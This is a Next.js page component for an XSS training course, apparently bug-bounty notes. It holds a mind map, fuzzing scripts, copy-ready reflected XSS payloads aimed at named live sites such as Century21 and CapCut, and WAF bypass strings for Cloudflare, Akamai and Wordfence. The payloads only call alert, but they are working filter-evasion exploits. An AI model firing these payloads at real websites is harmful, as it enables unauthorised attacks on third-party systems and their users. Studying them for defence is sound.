'use client';

import { useState } from 'react';
import { motion } from 'framer-motion';
import XMindTree from '@/components/XMindTree';
import { 
  Shield, ArrowLeft, BookOpen, Code, AlertTriangle, Zap, 
  Target, Bug, Globe, Terminal, Copy, Check, ExternalLink,
  Lightbulb, FileCode, Layers, Lock, Unlock
} from 'lucide-react';
import Link from 'next/link';

// Complete XSS Mind Map Tree
const xssCompleteTree = {
  label: 'Cross-Site Scripting (XSS)',
  children: [
    {
      label: 'encodings',
      children: [
        {
          label: 'html encoding',
          children: [
            {
              label: 'character references',
              children: [
                { label: '&lt; (<)' },
                { label: '&gt; (>)' },
                { label: '&colon; (:)' },
                { label: '&quot; (")' },
                { label: '&#39; (\')' },
              ],
            },
            {
              label: 'unicode',
              children: [
                { label: 'encoding multilingual plain text' },
                { label: '\\UXXXX (HEX)' },
                { label: 'a → &#x61 → %26%23x61' },
              ],
            },
          ],
        },
        {
          label: 'URL encoding',
          children: [
            { label: 'converts characters into another format' },
            { label: 'used in HTTP transmissions' },
            { label: '%HEX format' },
            { label: "⚠️ It doesn't work in JSON" },
          ],
        },
        {
          label: '🔑 need to know',
          children: [
            { label: 'HTML attributes are decoded automatically' },
            { label: 'unicodes are decoded in JavaScript' },
            { label: 'yashar === y\\u0061shar' },
          ],
        },
      ],
    },
    {
      label: 'discovery',
      children: [
        {
          label: 'outside a tag',
          children: [
            { label: '<script> tag injection' },
            {
              label: '<x> tags + event handlers',
              children: [
                { label: '<img/src/onerror=alert(origin)>' },
                { label: '<details/open/ontoggle=alert(origin)>' },
                { label: '<voorivex onmouseover=alert(origin)>' },
                { label: '<svg onload=alert(origin)>' },
              ],
            },
            {
              label: '<a> tag + javascript scheme',
              children: [
                { label: '<a href=javascript:alert(origin)>test</a>' },
                { label: '<a href="&#74;avascript&colon;alert(origin)">test</a>' },
                { label: '<a href="&#74;avascript&colon;\\u0061lert(origin)">test</a>' },
              ],
            },
            { label: 'non-executable tags' },
          ],
        },
        {
          label: 'inside a tag',
          children: [
            { label: 'break the attribute and the tag' },
            { label: 'break the attribute + event handlers' },
            {
              label: 'dangerous attributes',
              children: [
                { label: 'href in <a> tag' },
                { label: 'src in <iframe> tag' },
                { label: 'srcdoc in <iframe> tag' },
              ],
            },
          ],
        },
        {
          label: 'JavaScript context',
          children: [
            { label: 'close </script> tag' },
            { label: 'break the context with quotes' },
            { label: 'string concatenation bypass' },
          ],
        },
        {
          label: 'DOM XSS',
          children: [
            { label: 'look for dangerous sinks' },
            {
              label: 'most common sinks',
              children: [
                { label: 'window.open' },
                { label: 'window.location' },
                { label: 'window.location.href' },
                { label: 'innerHTML' },
                { label: 'document.write' },
                { label: 'eval()' },
              ],
            },
            { label: 'innerTEXT vs innerHTML' },
            { label: 'Sink → innerTEXT (NO XSS)' },
            { label: 'Sink → innerHTML (YES XSS)' },
            { label: 'can be both stored or reflected' },
            { label: 'postMessage vulnerabilities' },
          ],
        },
      ],
    },
    {
      label: 'fuzzing',
      children: [
        { label: '📚 Gareth Heyes - JavaScript for hackers' },
        {
          label: 'fuzzing for HTML tags',
          children: [
            { label: '<img[fuzz]src[fuzz]onerror=test>' },
            { label: '<svg onload=[fuzz]test>' },
            { label: '<ta[fuzz]g>' },
          ],
        },
        {
          label: 'fuzzing for JavaScript scheme',
          children: [
            { label: 'javascript[fuzz]:' },
            { label: 'java[FUZZ]script[FUZZ]:' },
            { label: '[FUZZ]javascript:' },
          ],
        },
        {
          label: 'valid separator characters',
          children: [
            { label: '%09 (\\t tab)' },
            { label: '%0A (\\n newline)' },
            { label: '%0D (\\r carriage return)' },
            { label: '%0C (form feed)' },
            { label: '/ (slash)' },
          ],
        },
      ],
    },
    {
      label: 'bypasses',
      children: [
        {
          label: 'known WAF?',
          children: [
            { label: 'yes → search on the Net!' },
            { label: 'no → CDN or application based?' },
            { label: 'no → build your own payload' },
          ],
        },
        { label: 'JS protection? → debug!' },
        {
          label: 'extend payload gently',
          children: [
            { label: '<x>' },
            { label: '<x onxxx>' },
            { label: '<x onxxx=' },
            { label: 'do NOT use noisy payloads first' },
          ],
        },
        {
          label: 'unicode bypasses',
          children: [
            { label: '\\u0061lert(origin)' },
            { label: '\\u{0061}lert(origin)' },
            { label: '\\u{000000000000061}lert(origin)' },
          ],
        },
        {
          label: 'parenthesis/brackets filtered',
          children: [
            { label: 'alert?.(origin)' },
            { label: 'window.valueOf=alert;window+1' },
            { label: '[origin].some(confirm)' },
          ],
        },
        {
          label: 'string obfuscation',
          children: [
            { label: "[][('cons'+'tructor')][('cons'+'tructor')]('aler'+'t(origin)')()" },
            { label: "location=location.hash.split('#')[1]" },
          ],
        },
        {
          label: 'WAF confusion',
          children: [
            { label: '<img src="/" =_=" title="onerror=\'prompt(origin)\'">' },
            { label: '<--`<img/src=` onerror=alert(origin)> --!>' },
            { label: '<!<script>confirm(origin)</script>' },
          ],
        },
        {
          label: 'HTML encoding bypass',
          children: [
            { label: '<input type="&#x3e"/onfocus="alert(origin)"/autofocus>' },
            { label: '<img src=\\u003e onerror=alert(origin)>' },
          ],
        },
      ],
    },
    {
      label: 'post XSS',
      children: [
        {
          label: 'account take-over (ATO)',
          children: [
            { label: 'change password' },
            { label: 'account bind' },
            { label: 'session hijacking' },
          ],
        },
        { label: 'PII information leakage' },
        { label: 'DOM based Stored XSS → ATO' },
        {
          label: 'severity increase',
          children: [
            { label: 'rXSS on tiktok → $2500' },
            { label: 'rXSS + ATO → $5000' },
            { label: 'CVSS 7.2 → 8.2 (Scope changed)' },
          ],
        },
      ],
    },
    {
      label: 'recap',
      children: [
        { label: 'if reflected value not in source → DOM XSS' },
        { label: 'enhance payload gently step by step' },
        { label: '⚠️ replacement after ruleset is a KILLER' },
        { label: 'unicode works in JavaScript codes' },
        { label: 'HTML encoding auto-decoded in attributes' },
        { label: 'dangerous sinks need user input' },
        { label: 'setup your own test-bed' },
        { label: 'XSS not related to Content-Type' },
        { label: '🔧 tools do not make hackers, hackers make tools' },
      ],
    },
  ],
};


// Student TODOs
const studentTodos = [
  { task: 'Learn gRPC like our session (including setup)', done: false },
  { task: 'Learn React like our session (including setup)', done: false },
  { task: 'XSS overview + WAF bypass', done: false },
  { task: 'Narrow recon overview (work on capcut.com)', done: false },
  { task: 'Understanding the payload: <a href="&#74;avascript&colon;\\u0061lert(origin)">test</a>', done: false },
  { task: 'Fuzz to discover characters here: <img src onerror=[FUZZ]alert(origin)>', done: false },
];

// Complete Real-world Examples
const realWorldExamples = [
  {
    title: 'Century21 Property Search',
    baseUrl: 'https://ssl.century21.com/property-search',
    description: 'Reflected XSS in location parameter',
    steps: [
      { step: 'Initial probe', url: '?location=voorivex', note: 'Check reflection in source' },
      { step: 'Test attribute break', url: '?location=voorivex">test', note: 'URL: voorivex%22%3Etest' },
      { step: 'XSS with img tag', url: '?location=voorivex"><img src onerror=alert(origin)>', note: 'Basic XSS' },
      { step: 'Autofocus bypass', url: '?location=asdasd" autofocus onfocus=confirm(origin) "', note: 'URL encoded: %20autofocus+onfocus%3Dconfirm(origin)%20"' },
    ],
    payloads: [
      'voorivex"><img src onerror=alert(origin)>',
      'asdasd" autofocus+onfocus%3Dconfirm(origin) "',
      'asdasd"%20autofocus+onfocus%3Dconfirm(origin)%20"',
    ],
  },
  {
    title: 'Trafalgar Payday (Script Context)',
    baseUrl: 'https://payday.trafalgar.co.za/payday/cgi-bin/claims.cgi',
    description: 'XSS by breaking out of script context',
    steps: [
      { step: 'Initial probe', url: '?log_user=&log_userid=voorivex', note: 'Check reflection' },
      { step: 'Test script break', url: '?log_user=&log_userid=voorivex</script>voorivex', note: 'Break script tag' },
      { step: 'SVG payload', url: '?log_user=&log_userid=voorivex</script>vmamad<svg onload=alert(origin)>', note: 'SVG onload' },
      { step: 'IMG payload', url: '?log_user=&log_userid=voorivex</script>mamad<img src=x onerror=alert(origin)>', note: 'IMG onerror' },
      { step: 'Script injection', url: '?log_user=&log_userid=voorivex</script>mamad<script>alert(origin)</script>', note: 'Direct script' },
    ],
    payloads: [
      'voorivex</script>vmamad<svg onload=alert(origin)>',
      'voorivex</script>mamad<img src=x onerror=alert(origin)>',
      'voorivex</script>mamad<script>alert(origin)</script>',
      'voorivex"-alert(origin)-"',
    ],
  },
  {
    title: 'CapCut Token Auth (JavaScript Scheme)',
    baseUrl: 'https://www.capcut.com/tokenAuth',
    description: 'Open redirect to XSS via javascript: scheme bypass',
    steps: [
      { step: 'Basic test', url: '?token=TOKEN&state=5315&redirect_url=javascript:alert(origin)', note: 'Blocked by filter' },
      { step: 'Newline bypass', url: '?token=TOKEN&state=5315&redirect_url=javascript%0A:alert(origin)', note: '%0A = newline' },
      { step: 'Null byte bypass', url: '?token=TOKEN&state=5315&redirect_url=%00javascript:alert(origin)', note: 'Null byte prefix' },
      { step: 'Control char bypass', url: '?token=TOKEN&state=5315&redirect_url=%01javascript:alert(origin)', note: 'Control character' },
    ],
    payloads: [
      'javascript%0A:alert(origin)',
      'javascript%0D:alert(origin)',
      'javascript%09:alert(origin)',
      '%00javascript:alert(origin)',
      '%01javascript:alert(origin)',
      '%15javascript:alert(window.origin)',
    ],
  },
  {
    title: 'Open Redirect to XSS',
    baseUrl: '87.248.145.244:8000/',
    description: 'JavaScript scheme in redirect parameter',
    steps: [
      { step: 'Basic redirect', url: '?redirect=javascript:alert(origin)', note: 'May be blocked' },
      { step: 'Unicode bypass', url: '?redirect=javascript:\\u0061lert(origin)', note: 'Unicode alert' },
      { step: 'Null byte', url: '?redirect=%00javascript:alert(window.origin)', note: 'Null prefix' },
      { step: 'Newline bypass', url: '?redirect=javascript%0a:alert(window.origin)', note: 'Newline in scheme' },
    ],
    payloads: [
      'javascript:alert(origin)',
      'javascript:\\u0061lert(origin)',
      '%00javascript:alert(window.origin)',
      'javascript%0a:alert(window.origin)',
    ],
  },
];

// Fuzzing Code Snippets
const fuzzingSnippets = [
  {
    title: 'JavaScript Scheme Character Fuzzer',
    description: 'Find characters that can be inserted in javascript: scheme',
    code: `log = [];
let anchor = document.createElement('a');
for (let i = 0; i <= 0x10ffff; i++) {
  anchor.href = \`javascript\${String.fromCodePoint(i)}:\`;
  if (anchor.protocol === 'javascript:') {
    log.push(i);
  }
}
console.log(log);
// Result: Array(4) [ 9, 10, 13, 58 ]
// Characters: "\\t", "\\n", "\\r", ":"
log.map(x => String.fromCharCode(x));`,
    result: '9 → %09 (tab), 10 → %0A (newline), 13 → %0D (carriage return), 58 → : (colon)',
  },
  {
    title: 'HTML Tag Attribute Separator Fuzzer',
    description: 'Find characters that work as attribute separators',
    code: `const div = document.createElement('div');
const result = [];
const worked = p => result.push(p);
for (let i = 0; i < 0x10ff; ++i) {
  div.innerHTML = \`<img\${String.fromCodePoint(i)}src=x\${String.fromCodePoint(i)}onerror=worked(\${i})>\`;
}
document.body.appendChild(div);
console.log(result.map(x => String.fromCharCode(x)));
// Result: Array(6) [ "\\t", "\\n", "\\u000c", "\\r", " ", "/" ]`,
    result: 'Tab, Newline, Form Feed (\\u000c), Carriage Return, Space, Slash',
  },
  {
    title: 'Window Event Handlers Finder',
    description: 'Find all on* event handlers on window object',
    code: `Object.keys(window).filter(k => k.indexOf('on') === 0);
// Or for more complete list:
Object.getOwnPropertyNames(window).filter(k => k.startsWith('on'));`,
    result: 'Lists all available event handlers like onclick, onerror, onload, etc.',
  },
];

// WAF Bypass Payloads
const wafBypassPayloads = [
  {
    category: 'Cloudflare WAF Bypass',
    payloads: [
      { payload: '<details/open/ontoggle=alert(origin)>', note: 'details tag bypass' },
      { payload: '<d3v/onmouseleave=[origin].some(confirm)>click', note: 'Custom tag + array method' },
      { payload: '<img%0Csrc%0Conerror=alert(origin)>', note: 'Form feed separator' },
    ],
  },
  {
    category: 'Akamai WAF Bypass (@black0x00mamba)',
    payloads: [
      { payload: '<img%20sr%00c=x o%00nerror=((pro%00mpt(1)))>', note: 'Null bytes in attributes' },
      { payload: '</*</script+>ssss<%00x%20stc=<script>alert(origin);//+++</*</script+/x>*/', note: 'Complex bypass' },
    ],
  },
  {
    category: 'Wordfence 7.4.2 Bypass',
    payloads: [
      { payload: '<a href=&#01javascript:alert(origin)>', note: 'Control char in href' },
      { payload: '<a href="&#12;javascript:alert(1337)">', note: 'Form feed before scheme' },
    ],
  },
  {
    category: 'Application WAF / JS Protection',
    payloads: [
      { payload: '\\u0061lert(origin)', note: 'Unicode escape' },
      { payload: '\\u{0061}lert(origin)', note: 'ES6 unicode' },
      { payload: '\\u{000000000000061}lert(origin)', note: 'Padded unicode' },
      { payload: 'alert?.(origin)', note: 'Optional chaining' },
      { payload: 'window.valueOf=alert;window+1', note: 'valueOf override' },
      { payload: "[]['cons'+'tructor']['cons'+'tructor']('aler'+'t(origin)')()", note: 'String concat' },
      { payload: "location=location.hash.split('#')[1]", note: 'Hash-based execution' },
      { payload: "eval(location.hash.split('#')[1])", note: 'Eval from hash' },
    ],
  },
];

// Review Payloads with explanations
const reviewPayloads = [
  {
    payload: '<body onload="console.log(\'&#39;);&#x61;lert(origin);//">',
    explanation: 'HTML entity decoded in attribute, executes alert',
  },
  {
    payload: '<img/src/onerror=\'console.log("&quot;);&#x61;lert(origin);//)\'>',
    explanation: 'Slash as separator, HTML entities in event handler',
  },
  {
    payload: '<img/src/onerror="\\u006llert(origin);">',
    explanation: 'Unicode escape in JavaScript context (note: \\u006l is invalid)',
  },
  {
    payload: '<iframe srcdoc="&lt;svg/onload=alert(origin)&gt;"></iframe>',
    explanation: 'Double encoding in srcdoc attribute',
  },
  {
    payload: '<a href="&#74;avascript&colon;alert(origin)">test</a>',
    explanation: 'HTML entities for "J" and ":" in javascript scheme',
  },
  {
    payload: '<a href=&#74;avascript&colon;alert(origin)>test</a>',
    explanation: 'Same without quotes - still works',
  },
  {
    payload: '<a/href=javascript&colon;alert()>click',
    explanation: 'Slash separator, entity for colon',
  },
];

// Content Types
const contentTypes = [
  { type: 'application/x-www-form-urlencoded', note: 'Default form submission, URL encoding works' },
  { type: 'multipart/form-data', note: 'File uploads, different encoding' },
  { type: 'application/json', note: 'URL encoding does NOT work here' },
];

// URL Encoding Reference
const urlEncodingRef = [
  { char: '<', encoded: '%3C' },
  { char: '>', encoded: '%3E' },
  { char: '"', encoded: '%22' },
  { char: "'", encoded: '%27' },
  { char: '/', encoded: '%2F' },
  { char: '=', encoded: '%3D' },
  { char: ' ', encoded: '%20 or +' },
  { char: ':', encoded: '%3A' },
  { char: '&', encoded: '%26' },
  { char: '#', encoded: '%23' },
  { char: '\\n', encoded: '%0A' },
  { char: '\\r', encoded: '%0D' },
  { char: '\\t', encoded: '%09' },
];

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  
  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      onClick={handleCopy}
      className="p-1 hover:bg-dark-700 rounded transition-colors"
      title="Copy to clipboard"
    >
      {copied ? (
        <Check className="w-3.5 h-3.5 text-green-400" />
      ) : (
        <Copy className="w-3.5 h-3.5 text-slate-500 hover:text-slate-300" />
      )}
    </button>
  );
}


export default function XSSNarutowLive4Page() {
  const [activeTab, setActiveTab] = useState<'mindmap' | 'examples' | 'fuzzing' | 'bypasses' | 'reference'>('mindmap');

  return (
    <div className="space-y-6">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className="flex items-center justify-between"
      >
        <div className="flex items-center gap-4">
          <Link
            href="/dashboard"
            className="p-2 hover:bg-dark-800 rounded-lg transition-colors"
          >
            <ArrowLeft className="w-5 h-5 text-slate-400 hover:text-white" />
          </Link>
          <div>
            <h1 className="text-2xl font-bold text-white flex items-center gap-3">
              <Shield className="w-6 h-6 text-primary-400" />
              XSS Complete Reference - Narutow Live 4
            </h1>
            <p className="text-slate-400 mt-1">Comprehensive Cross-Site Scripting notes with real-world examples</p>
          </div>
        </div>
        <span className="px-3 py-1 bg-primary-500/20 text-primary-400 rounded-full text-sm font-medium">
          Narutow Live 4
        </span>
      </motion.div>

      {/* Student TODOs */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.05 }}
        className="bg-dark-900/80 backdrop-blur rounded-xl border border-yellow-500/30 p-6"
      >
        <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
          <BookOpen className="w-5 h-5 text-yellow-400" />
          Student TODOs
        </h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
          {studentTodos.map((todo, index) => (
            <label key={index} className="flex items-start gap-3 text-slate-300 text-sm cursor-pointer hover:bg-dark-800/50 p-2 rounded-lg transition-colors">
              <input type="checkbox" className="mt-1 accent-primary-400" />
              <code className="font-mono text-xs bg-dark-800 px-2 py-1 rounded break-all">{todo.task}</code>
            </label>
          ))}
        </div>
      </motion.div>

      {/* Tab Navigation */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.1 }}
        className="flex flex-wrap gap-2"
      >
        {[
          { id: 'mindmap', label: 'Mind Map', icon: Layers },
          { id: 'examples', label: 'Real Examples', icon: Globe },
          { id: 'fuzzing', label: 'Fuzzing', icon: Terminal },
          { id: 'bypasses', label: 'WAF Bypasses', icon: Unlock },
          { id: 'reference', label: 'Reference', icon: FileCode },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as typeof activeTab)}
            className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm transition-all ${
              activeTab === tab.id
                ? 'bg-primary-500/20 text-primary-400 border border-primary-500/30'
                : 'bg-dark-800/50 text-slate-400 border border-dark-700 hover:border-dark-600 hover:text-slate-300'
            }`}
          >
            <tab.icon className="w-4 h-4" />
            {tab.label}
          </button>
        ))}
      </motion.div>

      {/* Mind Map Tab */}
      {activeTab === 'mindmap' && (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.15 }}
        >
          <XMindTree data={xssCompleteTree} title="XSS Knowledge Tree (XMind Style)" />
        </motion.div>
      )}

      {/* Real Examples Tab */}
      {activeTab === 'examples' && (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.15 }}
          className="space-y-6"
        >
          {realWorldExamples.map((example, index) => (
            <div key={index} className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6">
              <div className="flex items-start justify-between mb-4">
                <div>
                  <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                    <Target className="w-5 h-5 text-orange-400" />
                    {example.title}
                  </h3>
                  <p className="text-slate-400 text-sm mt-1">{example.description}</p>
                  <code className="text-xs text-cyan-400 font-mono mt-2 block">{example.baseUrl}</code>
                </div>
              </div>

              {/* Steps */}
              <div className="mb-4">
                <h4 className="text-sm font-semibold text-slate-300 mb-3">Attack Steps:</h4>
                <div className="space-y-2">
                  {example.steps.map((step, sIndex) => (
                    <div key={sIndex} className="flex items-start gap-3 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                      <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary-500/20 text-primary-400 flex items-center justify-center text-xs font-bold">
                        {sIndex + 1}
                      </span>
                      <div className="flex-1 min-w-0">
                        <p className="text-sm font-medium text-slate-200">{step.step}</p>
                        <code className="text-xs text-green-400 font-mono block mt-1 break-all">{step.url}</code>
                        {step.note && <p className="text-xs text-slate-500 mt-1">{step.note}</p>}
                      </div>
                      <CopyButton text={step.url} />
                    </div>
                  ))}
                </div>
              </div>

              {/* Payloads */}
              <div>
                <h4 className="text-sm font-semibold text-slate-300 mb-3">Working Payloads:</h4>
                <div className="space-y-2">
                  {example.payloads.map((payload, pIndex) => (
                    <div key={pIndex} className="flex items-center gap-2 p-2 bg-dark-800 rounded border border-dark-700">
                      <code className="flex-1 text-xs text-red-400 font-mono break-all">{payload}</code>
                      <CopyButton text={payload} />
                    </div>
                  ))}
                </div>
              </div>
            </div>
          ))}
        </motion.div>
      )}

      {/* Fuzzing Tab */}
      {activeTab === 'fuzzing' && (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.15 }}
          className="space-y-6"
        >
          {fuzzingSnippets.map((snippet, index) => (
            <div key={index} className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6">
              <div className="flex items-start justify-between mb-3">
                <div>
                  <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                    <Code className="w-5 h-5 text-green-400" />
                    {snippet.title}
                  </h3>
                  <p className="text-slate-400 text-sm mt-1">{snippet.description}</p>
                </div>
                <CopyButton text={snippet.code} />
              </div>
              <pre className="text-xs text-slate-300 bg-dark-950 p-4 rounded-lg font-mono overflow-x-auto border border-dark-700">
                {snippet.code}
              </pre>
              <div className="mt-3 p-3 bg-green-500/10 rounded-lg border border-green-500/30">
                <p className="text-sm text-green-400 font-medium">Result:</p>
                <p className="text-xs text-slate-300 mt-1 font-mono">{snippet.result}</p>
              </div>
            </div>
          ))}

          {/* Fuzzing Tips */}
          <div className="bg-dark-900/80 backdrop-blur rounded-xl border border-cyan-500/30 p-6">
            <h3 className="text-lg font-semibold text-white flex items-center gap-2 mb-4">
              <Lightbulb className="w-5 h-5 text-cyan-400" />
              Fuzzing Tips
            </h3>
            <ul className="space-y-2 text-sm text-slate-300">
              <li className="flex items-start gap-2">
                <span className="text-cyan-400">•</span>
                <span>Use browser console to run fuzzing scripts directly</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-cyan-400">•</span>
                <span>Characters 9, 10, 13 (%09, %0A, %0D) often bypass javascript: scheme filters</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-cyan-400">•</span>
                <span>Form feed (%0C) and slash (/) work as HTML attribute separators</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-cyan-400">•</span>
                <span>Reference: <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" className="text-blue-400 hover:underline">PortSwigger XSS Cheat Sheet</a></span>
              </li>
            </ul>
          </div>
        </motion.div>
      )}

      {/* WAF Bypasses Tab */}
      {activeTab === 'bypasses' && (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.15 }}
          className="space-y-6"
        >
          {/* Critical Insight */}
          <div className="bg-red-900/20 rounded-xl border border-red-500/30 p-6">
            <h3 className="text-lg font-semibold text-red-400 flex items-center gap-2 mb-3">
              <AlertTriangle className="w-5 h-5" />
              Critical Insight
            </h3>
            <p className="text-slate-300 mb-3">Replacement after ruleset is a KILLER for WAF and checker_function!</p>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-3 bg-green-500/10 rounded-lg border border-green-500/30">
                <p className="text-green-400 font-semibold text-sm">✓ Safe Implementation:</p>
                <ol className="text-xs text-slate-300 mt-2 space-y-1">
                  <li>1. Replacement/Sanitization</li>
                  <li>2. Ruleset/Validation</li>
                </ol>
              </div>
              <div className="p-3 bg-red-500/10 rounded-lg border border-red-500/30">
                <p className="text-red-400 font-semibold text-sm">✗ Vulnerable Implementation:</p>
                <ol className="text-xs text-slate-300 mt-2 space-y-1">
                  <li>1. Ruleset/Validation</li>
                  <li>2. Replacement/Sanitization</li>
                </ol>
              </div>
            </div>
            <p className="text-xs text-slate-400 mt-3">
              Example: <code className="bg-dark-800 px-1 rounded">javascript_PLACEMENT:alert(origin)</code> → after replacement → <code className="bg-dark-800 px-1 rounded">javascript:alert(origin)</code>
            </p>
          </div>

          {/* WAF Bypass Categories */}
          {wafBypassPayloads.map((category, index) => (
            <div key={index} className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6">
              <h3 className="text-lg font-semibold text-white flex items-center gap-2 mb-4">
                <Lock className="w-5 h-5 text-orange-400" />
                {category.category}
              </h3>
              <div className="space-y-2">
                {category.payloads.map((item, pIndex) => (
                  <div key={pIndex} className="flex items-start gap-3 p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                    <div className="flex-1 min-w-0">
                      <code className="text-xs text-red-400 font-mono break-all block">{item.payload}</code>
                      <p className="text-xs text-slate-500 mt-1">{item.note}</p>
                    </div>
                    <CopyButton text={item.payload} />
                  </div>
                ))}
              </div>
            </div>
          ))}

          {/* Review Payloads */}
          <div className="bg-dark-900/80 backdrop-blur rounded-xl border border-purple-500/30 p-6">
            <h3 className="text-lg font-semibold text-white flex items-center gap-2 mb-4">
              <Bug className="w-5 h-5 text-purple-400" />
              Review Payloads (with explanations)
            </h3>
            <div className="space-y-3">
              {reviewPayloads.map((item, index) => (
                <div key={index} className="p-3 bg-dark-800/50 rounded-lg border border-dark-700">
                  <div className="flex items-start gap-2">
                    <code className="flex-1 text-xs text-yellow-400 font-mono break-all">{item.payload}</code>
                    <CopyButton text={item.payload} />
                  </div>
                  <p className="text-xs text-slate-400 mt-2">→ {item.explanation}</p>
                </div>
              ))}
            </div>
          </div>
        </motion.div>
      )}

      {/* Reference Tab */}
      {activeTab === 'reference' && (
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.15 }}
          className="space-y-6"
        >
          {/* Key Concepts */}
          <div className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6">
            <h3 className="text-lg font-semibold text-white flex items-center gap-2 mb-4">
              <Zap className="w-5 h-5 text-primary-400" />
              Key Concepts
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
                <h4 className="text-sm font-semibold text-primary-400 mb-2">Severity & Bounties</h4>
                <ul className="space-y-1 text-slate-300 text-xs font-mono">
                  <li>• XSS low, high (60k)</li>
                  <li>• ATO high</li>
                  <li>• rXSS on tiktok → $2500</li>
                  <li>• rXSS + ATO → $5000</li>
                  <li>• CVSS 7.2 → 8.2 (Scope changed)</li>
                </ul>
              </div>
              <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
                <h4 className="text-sm font-semibold text-primary-400 mb-2">DOM vs Reflected XSS</h4>
                <ul className="space-y-1 text-slate-300 text-xs font-mono">
                  <li>• innerTEXT vs innerHTML</li>
                  <li>• Sink → innerTEXT (NO XSS)</li>
                  <li>• Sink → innerHTML (YES XSS)</li>
                  <li>• DOM XSS: value not in source</li>
                </ul>
              </div>
              <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
                <h4 className="text-sm font-semibold text-primary-400 mb-2">Encoding Transformations</h4>
                <ul className="space-y-1 text-slate-300 text-xs font-mono">
                  <li>• a → &amp;#x61 → %26%23x61</li>
                  <li>• alert(origin) → \u0061lert(origin)</li>
                  <li>• yashar === y\u0061shar</li>
                  <li>• \u0071rint(123) = print(123)</li>
                </ul>
              </div>
              <div className="p-4 bg-dark-800/50 rounded-lg border border-dark-700">
                <h4 className="text-sm font-semibold text-primary-400 mb-2">Content Types</h4>
                <ul className="space-y-1 text-slate-300 text-xs">
                  {contentTypes.map((ct, i) => (
                    <li key={i}>• <code className="text-cyan-400">{ct.type}</code> - {ct.note}</li>
                  ))}
                </ul>
              </div>
            </div>
          </div>

          {/* URL Encoding Reference */}
          <div className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6">
            <h3 className="text-lg font-semibold text-white flex items-center gap-2 mb-4">
              <FileCode className="w-5 h-5 text-green-400" />
              URL Encoding Reference
            </h3>
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-2">
              {urlEncodingRef.map((item, index) => (
                <div key={index} className="p-2 bg-dark-800/50 rounded border border-dark-700 text-center">
                  <code className="text-lg text-white">{item.char}</code>
                  <p className="text-xs text-green-400 font-mono mt-1">{item.encoded}</p>
                </div>
              ))}
            </div>
          </div>

          {/* Resources */}
          <div className="bg-dark-900/80 backdrop-blur rounded-xl border border-dark-800 p-6">
            <h3 className="text-lg font-semibold text-white flex items-center gap-2 mb-4">
              <BookOpen className="w-5 h-5 text-blue-400" />
              Resources
            </h3>
            <ul className="space-y-2 text-slate-300 text-sm">
              <li className="flex items-start gap-2">
                <span className="text-primary-400">📚</span>
                <span>Gareth Heyes - JavaScript for hackers - Learn to think like a hacker (2022)</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-primary-400">🔗</span>
                <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline flex items-center gap-1">
                  PortSwigger XSS Cheat Sheet <ExternalLink className="w-3 h-3" />
                </a>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-primary-400">🔗</span>
                <a href="https://blog.isec.pl/waf-evasion-techniques" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline flex items-center gap-1">
                  WAF Evasion Techniques - isec.pl <ExternalLink className="w-3 h-3" />
                </a>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-primary-400">🔗</span>
                <a href="https://labs.cognisys.group/posts/An-Interesting-XSS-Bypassing-WAF" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline flex items-center gap-1">
                  An Interesting XSS Bypassing WAF - Cognisys <ExternalLink className="w-3 h-3" />
                </a>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-primary-400">🐦</span>
                <a href="https://x.com/YShahinzadeh/status/1531555591562399745" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline flex items-center gap-1">
                  @YShahinzadeh XSS Example 1 <ExternalLink className="w-3 h-3" />
                </a>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-primary-400">🐦</span>
